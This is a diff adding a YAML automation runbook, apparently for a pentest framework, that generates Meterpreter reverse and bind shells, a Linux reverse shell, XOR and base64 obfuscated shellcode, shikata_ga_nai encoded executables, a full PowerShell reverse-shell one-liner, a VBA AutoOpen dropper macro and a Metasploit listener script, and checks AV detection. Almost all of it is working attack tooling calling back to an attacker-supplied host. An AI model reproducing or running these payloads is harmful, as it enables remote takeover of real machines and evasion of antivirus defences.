@@ -1,0 +1,203 @@
+# v2 runbook — Payload generation and obfuscation
+name: "Payload Generation & Obfuscation"
+description: "Generate, encode, and obfuscate payloads for various platforms: shellcode, reverse shells, droppers, bypass techniques"
+version: "2.0"
+
+vars:
+  lhost: ""
+  lport: ""
+  payload_arch: "x64"
+  platform: "windows"
+
+steps:
+  - id: preamble
+    type: log
+    message: "Payload generation — LHOST={lhost} LPORT={lport} (case: {case_id})"
+
+  # Phase 1: MSF payloads
+  - id: msf_payloads
+    name: "Metasploit payload generation"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: msf_reverse_tcp
+        name: "Windows reverse TCP shell"
+        tool: msfvenom
+        args: ["-p", "windows/{payload_arch}/meterpreter/reverse_tcp",
+               "LHOST={lhost}", "LPORT={lport}",
+               "-f", "exe", "-o",
+               "{case_dir}/payload_reverse_tcp.exe"]
+        timeout: 60
+        artifacts: ["{case_dir}/payload_reverse_tcp.exe"]
+
+      - id: msf_reverse_https
+        name: "Windows reverse HTTPS"
+        tool: msfvenom
+        args: ["-p", "windows/{payload_arch}/meterpreter/reverse_https",
+               "LHOST={lhost}", "LPORT={lport}",
+               "-f", "exe", "-o",
+               "{case_dir}/payload_reverse_https.exe"]
+        timeout: 60
+        artifacts: ["{case_dir}/payload_reverse_https.exe"]
+
+      - id: msf_bind_tcp
+        name: "Windows bind TCP shell"
+        tool: msfvenom
+        args: ["-p", "windows/{payload_arch}/meterpreter/bind_tcp",
+               "LPORT={lport}",
+               "-f", "exe", "-o",
+               "{case_dir}/payload_bind_tcp.exe"]
+        timeout: 60
+
+      - id: msf_linux
+        name: "Linux reverse TCP (elf)"
+        tool: msfvenom
+        args: ["-p", "linux/{payload_arch}/shell/reverse_tcp",
+               "LHOST={lhost}", "LPORT={lport}",
+               "-f", "elf", "-o",
+               "{case_dir}/payload_linux.elf"]
+        timeout: 60
+        artifacts: ["{case_dir}/payload_linux.elf"]
+
+  # Phase 2: Shellcode generation
+  - id: shellcode
+    name: "Shellcode generation"
+    type: parallel
+    steps:
+      - id: linux_shellcode
+        name: "Linux x64 execve shellcode"
+        tool: nasm
+        args: ["-f", "bin",
+               "-o", "{case_dir}/shellcode_execve.bin",
+               "-l", "{case_dir}/shellcode_execve.lst"]
+        timeout: 30
+
+      - id: windows_shellcode
+        name: "Windows win32 exec shellcode"
+        tool: msfvenom
+        args: ["-p", "windows/exec",
+               "CMD=calc.exe",
+               "-f", "raw", "-o",
+               "{case_dir}/shellcode_win32.bin"]
+        timeout: 30
+        artifacts: ["{case_dir}/shellcode_win32.bin"]
+
+  # Phase 3: Shellcode encoding & obfuscation
+  - id: obfuscation
+    name: "Payload obfuscation"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: msf_encoder
+        name: "MSF shikata-ga-nai encoding"
+        tool: msfvenom
+        args: ["-p", "windows/{payload_arch}/meterpreter/reverse_tcp",
+               "LHOST={lhost}", "LPORT={lport}",
+               "-e", "x86/shikata_ga_nai",
+               "-i", "5",
+               "-f", "exe",
+               "-o", "{case_dir}/payload_encoded.exe"]
+        timeout: 60
+        artifacts: ["{case_dir}/payload_encoded.exe"]
+
+      - id: xor_obfuscate
+        name: "XOR shellcode obfuscation"
+        tool: python3
+        args: ["-c", "\"import sys; data=open('{case_dir}/shellcode_win32.bin','rb').read(); key=0xAA; open('{case_dir}/shellcode_xored.bin','wb').write(bytes(b^key for b in data))\"",
+               "-o", "{case_dir}/shellcode_xored.bin"]
+        timeout: 30
+
+      - id: base64_wrapper
+        name: "Base64 payload wrapper"
+        tool: python3
+        args: ["-c", "\"import base64; d=open('{case_dir}/payload_reverse_tcp.exe','rb').read(); open('{case_dir}/payload_b64.txt','w').write(base64.b64encode(d).decode())\"",
+               "-o", "{case_dir}/payload_b64.txt"]
+        timeout: 30
+
+  # Phase 4: PowerShell & macro payloads
+  - id: macro_payloads
+    name: "Office macro & PowerShell payloads"
+    type: parallel
+    steps:
+      - id: ps_reverse
+        name: "PowerShell one-liner reverse shell"
+        tool: python3
+        args: ["-c",
+               "\"open('{case_dir}/ps_reverse.ps1','w').write('$c=New-Object System.Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};'.$c.Close()')\"",
+               "-o", "{case_dir}/ps_reverse.ps1"]
+        timeout: 30
+        artifacts: ["{case_dir}/ps_reverse.ps1"]
+
+      - id: ps_encoded
+        name: "PowerShell encoded command"
+        tool: python3
+        args: ["-c",
+               "\"import base64; cmd=f'$c=New-Object System.Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport});...'.encode('utf-16le'); open('{case_dir}/ps_encoded.txt','w').write(base64.b64encode(cmd).decode())\"",
+               "-o", "{case_dir}/ps_encoded.txt"]
+        timeout: 30
+
+      - id: vba_macro
+        name: "VBA dropper macro"
+        tool: python3
+        args: ["-c",
+               "\"open('{case_dir}/dropper.vba','w').write('''Sub AutoOpen()\\n    Dim str As String\\n    str = \\\"powershell -enc\\\"\\n    CreateObject(\\\"WScript.Shell\\\").Run str, 0, False\\nEnd Sub'''.replace('\\n', vbCrLf))\"",
+               "-o", "{case_dir}/dropper.vba"]
+        timeout: 30
+
+  # Phase 5: AV evasion checks
+  - id: evasion
+    name: "AV evasion checks"
+    type: parallel
+    steps:
+      - id: check_hash
+        name: "Payload hash"
+        tool: sha256sum
+        args: ["{case_dir}/payload_reverse_tcp.exe"]
+        timeout: 30
+
+      - id: vt_check
+        name: "VirusTotal lookup (via hash)"
+        tool: curl
+        args: ["-s",
+               "https://www.virustotal.com/api/v3/files/$(sha256sum {case_dir}/payload_reverse_tcp.exe | cut -d' ' -f1)",
+               "-H", "x-apikey: {vt_api_key}",
+               "-o", "{case_dir}/vt_result.json"]
+        timeout: 30
+        when: "has:vt_api_key"
+
+  # Phase 6: Listener setup reminder
+  - id: ask_listener
+    type: prompt
+    message: "Start Metasploit listener for the generated payloads?"
+    then:
+      - id: listener_rc
+        name: "Generate MSF listener resource script"
+        tool: python3
+        args: ["-c",
+               "\"open('{case_dir}/listener.rc','w').write('use exploit/multi/handler\\nset PAYLOAD windows/{payload_arch}/meterpreter/reverse_tcp\\nset LHOST {lhost}\\nset LPORT {lport}\\nset ExitOnSession false\\nrun -j')\"",
+               "-o", "{case_dir}/listener.rc"]
+        timeout: 30
+        artifacts: ["{case_dir}/listener.rc"]
+
+  # Phase 7: Report
+  - id: report
+    name: "Generate payload report"
+    type: report
+    format: markdown
+    title: "Payload Generation Report — {lhost}:{lport}"
+    output: "{case_dir}/payload-report.md"
+    sections:
+      - heading: "Summary"
+        body: "- LHOST: {lhost}\n- LPORT: {lport}\n- Platform: {platform}\n- Arch: {payload_arch}"
+      - heading: "Generated Payloads"
+        body: "- Reverse TCP: {case_dir}/payload_reverse_tcp.exe\n- Reverse HTTPS: {case_dir}/payload_reverse_https.exe\n- Encoded: {case_dir}/payload_encoded.exe\n- Linux ELF: {case_dir}/payload_linux.elf\n- PowerShell: {case_dir}/ps_reverse.ps1\n- VBA macro: {case_dir}/dropper.vba"
+      - heading: "Obfuscation"
+        body: "- XOR shellcode: {case_dir}/shellcode_xored.bin\n- Base64 encoded: {case_dir}/payload_b64.txt\n- MSF encoded: {case_dir}/payload_encoded.exe"
+      - heading: "Listener"
+        body: "- MSF resource script: {case_dir}/listener.rc"
+
+postflight:
+  - id: done
+    type: notify
+    level: success
+    message: "Payload generation complete — {case_dir}"
